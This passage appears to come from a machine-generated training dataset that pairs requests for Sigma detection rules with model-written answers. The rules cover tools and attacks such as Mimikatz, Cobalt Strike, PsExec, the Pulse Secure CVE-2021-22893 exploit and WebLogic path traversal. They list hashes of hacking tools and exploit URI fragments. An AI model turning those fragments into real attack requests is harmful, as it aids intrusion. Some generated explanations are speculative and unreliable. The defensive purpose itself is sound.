IMPHASH=ADA161BF41B8E5E9132858CB54CAB5FB # DripLoader\n            - IMPHASH=2A1BC4913CD5ECB0434DF07CB675B798 # DripLoader\n            - IMPHASH=11083E75553BAAE21DC89CE8F9A195E4 # DripLoader\n            - IMPHASH=A23D29C9E566F2FA8FFBB79267F5DF80 # DripLoader\n            - IMPHASH=4A07F944A83E8A7C2525EFA35DD30E2F # CreateMiniDump\n            - IMPHASH=767637C23BB42CD5D7397CF58B0BE688 # UACMe Akagi\n            - IMPHASH=14C4E4C72BA075E9069EE67F39188AD8 # UACMe Akagi\n            - IMPHASH=3C782813D4AFCE07BBFC5A9772ACDBDC # UACMe Akagi\n            - IMPHASH=7D010C6BB6A3726F327F7E239166D127 # UACMe Akagi\n            - IMPHASH=89159BA4DD04E4CE5559F132A9964EB3 # UACMe Akagi\n            - IMPHASH=6F33F4A5FC42B8CEC7314947BD13F30F # UACMe Akagi\n            - IMPHASH=5834ED4291BDEB928270428EBBAF7604 # UACMe Akagi\n            - IMPHASH=5A8A8A43F25485E7EE1B201EDCBC7A38 # UACMe Akagi\n            - IMPHASH=DC7D30B90B2D8ABF664FBED2B1B59894 # UACMe Akagi\n            - IMPHASH=41923EA1F824FE63EA5BEB84DB7A3E74 # UACMe Akagi\n            - IMPHASH=3DE09703C8E79ED2CA3F01074719906B # UACMe Akagi\n            - IMPHASH=A53A02B997935FD8EEDCB5F7ABAB9B9F # WCE\n            - IMPHASH=E96A73C7BF33A464C510EDE582318BF2 # WCE\n            - IMPHASH=32089B8851BBF8BC2D014E9F37288C83 # Sliver Stagers\n            - IMPHASH=09D278F9DE118EF09163C6140255C690 # Dumpert\n            - IMPHASH=03866661686829d806989e2fc5a72606 # Dumpert\n            - IMPHASH=e57401fbdadcd4571ff385ab82bd5d6d # Dumpert\n            - IMPHASH=84B763C45C0E4A3E7CA5548C710DB4EE # SysmonEnte\n            - IMPHASH=19584675D94829987952432E018D5056 # SysmonQuiet\n            - IMPHASH=330768A4F172E10ACB6287B87289D83B # ShaprEvtMute Hook\n    condition: selection\nfalsepositives:\n    - Legitimate use of one of these tools\nlevel: critical\n",
      "question": "execution of different Windows based hacktools via their import hash (imphash) even if the files have been renamed",
      "answer": "In order to detect the execution of different Windows based hacktools via their import hash (imphash) even if the files have been renamed, you should monitor process creation logs on Windows systems for specific import hashes that are known to be associated with various hacking tools and malware. These import hashes are unique to certain binaries or executable files used in attacks and can be used to identify malicious activity even when attackers rename the files to evade detection. Specifically, look for process creation events where the imphash matches any of the following:\n\n- A series of hashes related to the PetitPotam exploit which can be used for NTLM relay attacks in Active Directory environments.\n- Multiple hashes for Mimikatz, a well-known tool used for harvesting credentials from Windows systems.\n- Various hashes for JuicyPotato, JuicyPotatoNG, and RoguePotato, which are utilities exploiting permission issues to escalate privileges.\n- Several hashes identifying instances of Pwdump and PwDumpX, tools for extracting password hashes from Windows.\n- Hashes for Htran, which is used for proxying network traffic to obscure the source of attacks.\n- Cobalt Strike beacons indicated by specific hashes, which represent command and control software used in attacks.\n- Identifiers for PPLDump, a utility to dump protected process memory, critical for bypassing system protections.\n- NanoDump hashes, for a tool that specifically targets dumping credentials and other sensitive information stealthily.\n- HandleKatz, which presumably relates to Kerberos ticket handling and manipulation.\n- DripLoader detections using its unique imphashes, a method of evading antivirus detections when delivering payloads.\n- Import hashes corresponding to UACMe, a collection of methods for bypassing User Account Control (UAC).\n- Specific hashes for Windows Credential Editor (WCE), used for editing or removing Windows credentials.\n- Indicators for Sliver, an adversary simulation framework, similar to Cobalt Strike but open source.\n- Hashes relating to Dumpert, a tool for memory dumping designed to evade defensive measures.\n- Signature hashes for evidence of SysmonEnte, SysmonQuiet usage, and ShaprEvtMute Hook, which can indicate sophisticated evasion techniques against system monitoring.\n\nIt\u2019s critical to understand that, due to the nature of these tools, there might be false positives\u2014legitimate uses of these utilities for administrative purposes. Therefore, each detection should be carefully reviewed to confirm malicious intent. The level of threat for this behavior is considered critical due to the potential for these tools to be used in credential theft, privilege escalation, lateral movement, or establishing a persistent threat within the network."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Rule to detect the Hybrid Connection Manager service running on an endpoint..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the Hybrid Connection Manager service running on an endpoint, you should monitor the Windows Microsoft Service Bus Client logs for specific event IDs and keywords that indicate unauthorized or suspicious activity. Look for logs with event IDs 40300, 40301, and 40302. These event IDs are critical in identifying potential misuse or unauthorized configuration changes in the Hybrid Connection Manager service. Additionally, pay attention to entries containing specific keywords such as 'HybridConnection', 'sb://', 'servicebus.windows.net', and 'HybridConnectionManage'. These keywords are associated with the configuration and management of Hybrid Connections, which could indicate an attempt to manipulate connection settings or unauthorized access to the service. \n\nIt is important to consider the context in which these logs appear. The presence of these event IDs and keywords does not necessarily imply malicious activity. Legitimate use of Hybrid Connection Manager via Azure function apps could generate similar logs. Therefore, any detection should be contextualized, and further investigation is warranted to determine if the activity is indeed unauthorized or malicious. The significance of monitoring these logs lies in the ability to quickly identify and respond to unauthorized access or configuration changes, which are critical for maintaining the security and integrity of the service. These monitoring practices are aligned with several cyber-security frameworks and protocols designed to protect against unauthorized access and potential data breaches.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: microsoft-servicebus-client\ndetection:\n    selection:\n        EventID:\n            - 40300\n            - 40301\n            - 40302\n    keywords:\n        - 'HybridConnection'\n        - 'sb://'\n        - 'servicebus.windows.net'\n        - 'HybridConnectionManage'\n    condition: selection and keywords\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: microsoft-servicebus-client\ndetection:\n    selection:\n        EventID:\n            - 40300\n            - 40301\n            - 40302\n    keywords:\n        - 'HybridConnection'\n        - 'sb://'\n        - 'servicebus.windows.net'\n        - 'HybridConnectionManage'\n    condition: selection and keywords\nfalsepositives:\n    - Legitimate use of Hybrid Connection Manager via Azure function apps.\nlevel: high\n",
      "question": "Rule to detect the Hybrid Connection Manager service running on an endpoint.",
      "answer": "In order to detect the Hybrid Connection Manager service running on an endpoint, you should monitor the Windows Microsoft Service Bus Client logs for specific event IDs and keywords that indicate unauthorized or suspicious activity. Look for logs with event IDs 40300, 40301, and 40302. These event IDs are critical in identifying potential misuse or unauthorized configuration changes in the Hybrid Connection Manager service. Additionally, pay attention to entries containing specific keywords such as 'HybridConnection', 'sb://', 'servicebus.windows.net', and 'HybridConnectionManage'. These keywords are associated with the configuration and management of Hybrid Connections, which could indicate an attempt to manipulate connection settings or unauthorized access to the service. \n\nIt is important to consider the context in which these logs appear. The presence of these event IDs and keywords does not necessarily imply malicious activity. Legitimate use of Hybrid Connection Manager via Azure function apps could generate similar logs. Therefore, any detection should be contextualized, and further investigation is warranted to determine if the activity is indeed unauthorized or malicious. The significance of monitoring these logs lies in the ability to quickly identify and respond to unauthorized access or configuration changes, which are critical for maintaining the security and integrity of the service. These monitoring practices are aligned with several cyber-security frameworks and protocols designed to protect against unauthorized access and potential data breaches."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempts using Pulse Connect Secure(PCS) vulnerability (CVE-2021-22893).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts using Pulse Connect Secure (PCS) vulnerability (CVE-2021-22893), you should monitor your web server's logs for specific patterns in the query strings of URIs. Look for URIs containing '/dana-na/auth/', '/dana-ws/', '/dana-cached/', which are indicative of accessing different components of the PCS. Additionally, keep an eye out for query parameters such as '?id=', '?token=', 'Secid_canceltoken.cgi', 'CGI::param', 'meeting', 'smb', 'namedusers', and 'metric'. These parameters often appear in malicious queries attempting to exploit the PCS vulnerability. Both sets of patterns need to be present in the logs for an alert to be generated. Be aware that vulnerability scanning activities might also trigger these alerts even if an actual attack is not taking place, so these instances should be considered when evaluating alerts. This detection is important for maintaining the integrity of the PCS and ensuring it is not compromised by attackers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains:\n            - '/dana-na/auth/'\n            - '/dana-ws/'\n            - '/dana-cached/'\n    selection2:\n        cs-uri-query|contains:\n            - '?id='\n            - '?token='\n            - 'Secid_canceltoken.cgi'\n            - 'CGI::param'\n            - 'meeting'\n            - 'smb'\n            - 'namedusers'\n            - 'metric'\n    condition: all of selection*\nfalsepositives:\n    - Vulnerability Scanning\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains:\n            - '/dana-na/auth/'\n            - '/dana-ws/'\n            - '/dana-cached/'\n    selection2:\n        cs-uri-query|contains:\n            - '?id='\n            - '?token='\n            - 'Secid_canceltoken.cgi'\n            - 'CGI::param'\n            - 'meeting'\n            - 'smb'\n            - 'namedusers'\n            - 'metric'\n    condition: all of selection*\nfalsepositives:\n    - Vulnerability Scanning\nlevel: high\n",
      "question": "exploitation attempts using Pulse Connect Secure(PCS) vulnerability (CVE-2021-22893)",
      "answer": "In order to detect exploitation attempts using Pulse Connect Secure (PCS) vulnerability (CVE-2021-22893), you should monitor your web server's logs for specific patterns in the query strings of URIs. Look for URIs containing '/dana-na/auth/', '/dana-ws/', '/dana-cached/', which are indicative of accessing different components of the PCS. Additionally, keep an eye out for query parameters such as '?id=', '?token=', 'Secid_canceltoken.cgi', 'CGI::param', 'meeting', 'smb', 'namedusers', and 'metric'. These parameters often appear in malicious queries attempting to exploit the PCS vulnerability. Both sets of patterns need to be present in the logs for an alert to be generated. Be aware that vulnerability scanning activities might also trigger these alerts even if an actual attack is not taking place, so these instances should be considered when evaluating alerts. This detection is important for maintaining the integrity of the PCS and ensuring it is not compromised by attackers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\nWe can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml)\nIn some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon's events.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should focus on monitoring the Windows registry settings, specifically within the system's registry key modifications. Look for events where a value is being set (EventType: SetValue) in registry paths that include 'HKLM\\System\\CurrentControlSet\\Services'. This indicates a service installation or modification, which could be malicious if associated with known patterns.\n\nYou should pay particular attention to two specific sets of conditions that can signal a malicious service install. One set involves any registry modifications that contain both the 'ADMIN$' share and an executable file ('.exe'). This can indicate an attempt to install or modify a service for remote administration or execution of malicious code. The second set of conditions to watch for includes modifications that contain the command processor environment variable ('%COMSPEC%'), the 'start' command, and 'powershell'. This combination suggests an attempt to leverage PowerShell from a command script for potentially malicious purposes, such as executing scripts or commands that install services associated with a Cobalt Strike beacon.\n\nWhile monitoring these activities, be aware that not all modifications fitting these patterns are definitively malicious, and unknown false positives can occur. However, given the critical level of this behavior, any detection warrants immediate investigation. This monitoring is based on observing registry settings changes in Windows environments, aimed specifically at catching malicious service installations related to Cobalt Strike beacon activities, which are known for their capabilities in elevating privileges and facilitating lateral movement within compromised networks. These activities are usually logged under event 7045 in system logs, but can also be detected through specific registry key modifications as described.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    main:\n        EventType: SetValue\n        TargetObject|contains: 'HKLM\\System\\CurrentControlSet\\Services'\n    selection_1:\n        Details|contains|all:\n            - 'ADMIN$'\n            - '.exe'\n    selection_2:\n        Details|contains|all:\n            - '%COMSPEC%'\n            - 'start'\n            - 'powershell'\n    condition: main and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    main:\n        EventType: SetValue\n        TargetObject|contains: 'HKLM\\System\\CurrentControlSet\\Services'\n    selection_1:\n        Details|contains|all:\n            - 'ADMIN$'\n            - '.exe'\n    selection_2:\n        Details|contains|all:\n            - '%COMSPEC%'\n            - 'start'\n            - 'powershell'\n    condition: main and 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\nWe can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml)\nIn some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon's events.\n",
      "answer": "In order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should focus on monitoring the Windows registry settings, specifically within the system's registry key modifications. Look for events where a value is being set (EventType: SetValue) in registry paths that include 'HKLM\\System\\CurrentControlSet\\Services'. This indicates a service installation or modification, which could be malicious if associated with known patterns.\n\nYou should pay particular attention to two specific sets of conditions that can signal a malicious service install. One set involves any registry modifications that contain both the 'ADMIN$' share and an executable file ('.exe'). This can indicate an attempt to install or modify a service for remote administration or execution of malicious code. The second set of conditions to watch for includes modifications that contain the command processor environment variable ('%COMSPEC%'), the 'start' command, and 'powershell'. This combination suggests an attempt to leverage PowerShell from a command script for potentially malicious purposes, such as executing scripts or commands that install services associated with a Cobalt Strike beacon.\n\nWhile monitoring these activities, be aware that not all modifications fitting these patterns are definitively malicious, and unknown false positives can occur. However, given the critical level of this behavior, any detection warrants immediate investigation. This monitoring is based on observing registry settings changes in Windows environments, aimed specifically at catching malicious service installations related to Cobalt Strike beacon activities, which are known for their capabilities in elevating privileges and facilitating lateral movement within compromised networks. These activities are usually logged under event 7045 in system logs, but can also be detected through specific registry key modifications as described."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of the lesser known remote execution tool named CsExec a PsExec alternative.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the lesser known remote execution tool named CsExec a PsExec alternative, you should: Focus on monitoring process creation logs within the Windows environment. Specifically, look for instances where the process image name ends with '\\csexec.exe'. Additionally, pay attention to the process executable's description to identify any occurrences that include 'csexec'. This monitoring approach is critical for identifying potentially malicious activity associated with remote execution tools similar to PsExec, but less commonly used, such as CsExec. Given that such tools can be utilized for legitimate administrative purposes as well as malicious actions, it's important to consider that some detections might not always pinpoint harmful activity (hence, the occasional unknown false positives). The significance of detecting such tools comes from their association with various cyber attack tactics and techniques, notably those involving execution and lateral movement. By focusing on these specific attributes in the process creation logs, effective detection mechanisms can be established to alert high-level threats possibly indicated by the use of CsExec for remote execution purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csexec.exe'\n    selection_pe:\n        Description: 'csexec'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\csexec.exe'\n    selection_pe:\n        Description: 'csexec'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "use of the lesser known remote execution tool named CsExec a PsExec alternative",
      "answer": "In order to detect the use of the lesser known remote execution tool named CsExec a PsExec alternative, you should: Focus on monitoring process creation logs within the Windows environment. Specifically, look for instances where the process image name ends with '\\csexec.exe'. Additionally, pay attention to the process executable's description to identify any occurrences that include 'csexec'. This monitoring approach is critical for identifying potentially malicious activity associated with remote execution tools similar to PsExec, but less commonly used, such as CsExec. Given that such tools can be utilized for legitimate administrative purposes as well as malicious actions, it's important to consider that some detections might not always pinpoint harmful activity (hence, the occasional unknown false positives). The significance of detecting such tools comes from their association with various cyber attack tactics and techniques, notably those involving execution and lateral movement. By focusing on these specific attributes in the process creation logs, effective detection mechanisms can be established to alert high-level threats possibly indicated by the use of CsExec for remote execution purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting default PsExec service filename which indicates PsExec service installation and execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect default PsExec service filename which indicates PsExec service installation and execution, you should: monitor file events on Windows systems for occurrences where a filename ends with '\\PSEXESVC.exe'. This is significant as it signifies the installation or execution of the PsExec service, a legitimate tool that can be used by attackers for lateral movement or executing commands. For any detected event, collecting details such as EventID, CommandLine, ParentCommandLine, ServiceName, ServiceFileName, TargetFilename, and PipeName is essential. Although this detection rule carries a low level of potential false positives, it's vital to stay vigilant for any unknown scenarios that might trigger this alert inadvertently.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|endswith: '\\PSEXESVC.exe'\n    condition: selection\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - ServiceName\n    - ServiceFileName\n    - TargetFilename\n    - PipeName\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|endswith: '\\PSEXESVC.exe'\n    condition: selection\nfields:\n    - EventID\n    - CommandLine\n    - ParentCommandLine\n    - ServiceName\n    - ServiceFileName\n    - TargetFilename\n    - PipeName\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "default PsExec service filename which indicates PsExec service installation and execution",
      "answer": "In order to detect default PsExec service filename which indicates PsExec service installation and execution, you should: monitor file events on Windows systems for occurrences where a filename ends with '\\PSEXESVC.exe'. This is significant as it signifies the installation or execution of the PsExec service, a legitimate tool that can be used by attackers for lateral movement or executing commands. For any detected event, collecting details such as EventID, CommandLine, ParentCommandLine, ServiceName, ServiceFileName, TargetFilename, and PipeName is essential. Although this detection rule carries a low level of potential false positives, it's vital to stay vigilant for any unknown scenarios that might trigger this alert inadvertently."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempts on WebLogic servers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts on WebLogic servers, you should: Monitor webserver logs for specific query patterns in the requested URLs. The patterns to look out for include occurrences of '/console/images/%252E%252E%252Fconsole.portal' and '/console/css/%2e', which are encoded sequences that could indicate an attempt to exploit vulnerabilities in WebLogic servers by navigating directories in an unauthorized manner. Pay attention to fields such as the client IP address (c-ip) and the client DNS name (c-dns), as these can provide further context about the origin of the request. Be aware that as of now, there are no known benign reasons for these patterns to appear in legitimate traffic, indicating a high severity level for these detection criteria.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains:\n            - '/console/images/%252E%252E%252Fconsole.portal'\n            - '/console/css/%2e'\n    condition: selection\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains:\n            - '/console/images/%252E%252E%252Fconsole.portal'\n            - '/console/css/%2e'\n    condition: selection\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "exploitation attempts on WebLogic servers",
      "answer": "In order to detect exploitation attempts on WebLogic servers, you should: Monitor webserver logs for specific query patterns in the requested URLs. The patterns to look out for include occurrences of '/console/images/%252E%252E%252Fconsole.portal' and '/console/css/%2e', which are encoded sequences that could indicate an attempt to exploit vulnerabilities in WebLogic servers by navigating directories in an unauthorized manner. Pay attention to fields such as the client IP address (c-ip) and the client DNS name (c-dns), as these can provide further context about the origin of the request. Be aware that as of now, there are no known benign reasons for these patterns to appear in legitimate traffic, indicating a high severity level for these detection criteria."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the Impersonate tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the Impersonate tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should monitor for specific activity indicative of this tool's operation within Windows process creation logs. Look for the execution of a process named \"impersonate.exe\" in the command line. Additionally, watch for command-line options indicative of the tool's use, such as 'list', 'exec', and 'adduser'. To enhance the detection accuracy, also check for the presence of specific hash values associated with the Impersonate tool. These hash values include an MD5 hash of '9520714AB576B0ED01D1513691377D01', a SHA256 hash of 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A', and an IMPHASH of '0A358FFC1697B7A07D0E817AC740DF62'. The detection should trigger if any of the command-line criteria are met or if one of the specified hashes is identified. Maintaining a cautious approach to potential false positives is advised, as their occurrence is currently deemed unknown. This observance is evaluated at a medium level of importance in the context of cybersecurity efforts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_commandline_exe:\n        CommandLine|contains: 'impersonate.exe'\n    selection_commandline_opt:\n        CommandLine|contains:\n            - ' list '\n            - ' exec '\n            - ' adduser '\n    selection_hash_plain:\n        Hashes|contains:\n            - 'MD5=9520714AB576B0ED01D1513691377D01'\n            - 'SHA256=E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n            - 'IMPHASH=0A358FFC1697B7A07D0E817AC740DF62'\n    selection_hash_ext:\n        - md5: '9520714AB576B0ED01D1513691377D01'\n        - sha256: 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n        - Imphash: '0A358FFC1697B7A07D0E817AC740DF62'\n    condition: all of selection_commandline_* or 1 of selection_hash_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_commandline_exe:\n        CommandLine|contains: 'impersonate.exe'\n    selection_commandline_opt:\n        CommandLine|contains:\n            - ' list '\n            - ' exec '\n            - ' adduser '\n    selection_hash_plain:\n        Hashes|contains:\n            - 'MD5=9520714AB576B0ED01D1513691377D01'\n            - 'SHA256=E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n            - 'IMPHASH=0A358FFC1697B7A07D0E817AC740DF62'\n    selection_hash_ext:\n        - md5: '9520714AB576B0ED01D1513691377D01'\n        - sha256: 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A'\n        - Imphash: '0A358FFC1697B7A07D0E817AC740DF62'\n    condition: all of selection_commandline_* or 1 of selection_hash_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of the Impersonate tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively",
      "answer": "In order to detect execution of the Impersonate tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should monitor for specific activity indicative of this tool's operation within Windows process creation logs. Look for the execution of a process named \"impersonate.exe\" in the command line. Additionally, watch for command-line options indicative of the tool's use, such as 'list', 'exec', and 'adduser'. To enhance the detection accuracy, also check for the presence of specific hash values associated with the Impersonate tool. These hash values include an MD5 hash of '9520714AB576B0ED01D1513691377D01', a SHA256 hash of 'E81CC96E2118DC4FBFE5BAD1604E0AC7681960143E2101E1A024D52264BB0A8A', and an IMPHASH of '0A358FFC1697B7A07D0E817AC740DF62'. The detection should trigger if any of the command-line criteria are met or if one of the specified hashes is identified. Maintaining a cautious approach to potential false positives is advised, as their occurrence is currently deemed unknown. This observance is evaluated at a medium level of importance in the context of cybersecurity efforts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function, you should: Focus on monitoring registry event logs on Windows systems. Watch specifically for events where the target object contains references to '\\Services\\HybridConnectionManager' or where the event type indicates a change in value (`SetValue`) coupled with details that contain 'Microsoft.HybridConnectionManager.Listener.exe'. These actions might represent attempts to install or modify the Azure Hybrid Connection Manager service, which could facilitate remote code execution from an Azure function. It's important to understand that due to the nature of these indicators, there could be cases where legitimate activities trigger these conditions, though such instances are not well documented and thus considered unknown. Nonetheless, these activities are flagged with a high severity level due to their potential implications related to remote code execution threats, specifically targeting techniques of Execution and Persistence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection1:\n        TargetObject|contains: '\\Services\\HybridConnectionManager'\n    selection2:\n        EventType: SetValue\n        Details|contains: 'Microsoft.HybridConnectionManager.Listener.exe'\n    condition: selection1 or selection2\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection1:\n        TargetObject|contains: '\\Services\\HybridConnectionManager'\n    selection2:\n        EventType: SetValue\n        Details|contains: 'Microsoft.HybridConnectionManager.Listener.exe'\n    condition: selection1 or selection2\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function.",
      "answer": "In order to detect the installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function, you should: Focus on monitoring registry event logs on Windows systems. Watch specifically for events where the target object contains references to '\\Services\\HybridConnectionManager' or where the event type indicates a change in value (`SetValue`) coupled with details that contain 'Microsoft.HybridConnectionManager.Listener.exe'. These actions might represent attempts to install or modify the Azure Hybrid Connection Manager service, which could facilitate remote code execution from an Azure function. It's important to understand that due to the nature of these indicators, there could be cases where legitimate activities trigger these conditions, though such instances are not well documented and thus considered unknown. Nonetheless, these activities are flagged with a high severity level due to their potential implications related to remote code execution threats, specifically targeting techniques of Execution and Persistence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation or modification of a vscode related powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation or modification of a vscode related powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence, you should: Monitor Windows file events for any instances where a file ends with the name '\\Microsoft.VSCode_profile.ps1'. This specific file pertains to the Visual Studio Code editor's PowerShell profile, which can be leveraged by attackers to establish persistence by executing malicious scripts every time the PowerShell is opened with Visual Studio Code. It's important to note, however, that developers and administrators might legitimately modify this file as part of their routine use of Visual Studio Code for script development or system management. Given the potentially benign nature of modifications to this file, any detection carries a medium level of concern, suggesting that while monitoring this activity is important, each instance should be investigated to distinguish between legitimate use and malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: '\\Microsoft.VSCode_profile.ps1'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the profile by developers or administrators\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: '\\Microsoft.VSCode_profile.ps1'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the profile by developers or administrators\nlevel: medium\n",
      "question": "creation or modification of a vscode related powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence",
      "answer": "In order to detect the creation or modification of a vscode related powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence, you should: Monitor Windows file events for any instances where a file ends with the name '\\Microsoft.VSCode_profile.ps1'. This specific file pertains to the Visual Studio Code editor's PowerShell profile, which can be leveraged by attackers to establish persistence by executing malicious scripts every time the PowerShell is opened with Visual Studio Code. It's important to note, however, that developers and administrators might legitimately modify this file as part of their routine use of Visual Studio Code for script development or system management. Given the potentially benign nature of modifications to this file, any detection carries a medium level of concern, suggesting that while monitoring this activity is important, each instance should be investigated to distinguish between legitimate use and malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags, you should: monitor process creation logs on Windows systems for the execution of `wuauclt.exe` without the presence of any command line flags. This involves looking for events where either the image path ends with `\\Wuauclt.exe`, the original file name is exactly `Wuauclt.exe`, or the command line ends with `\\Wuauclt.exe` but does not include additional command line arguments. Such activities, without the use of any command line flags, are considered highly unusual and could indicate a malicious attempt to mimic the Windows Update Agent for nefarious purposes. It is important to note, however, that since the detection strategy can potentially yield unknown false positives, any alert should be carefully investigated for confirmation.",
    "context": "",
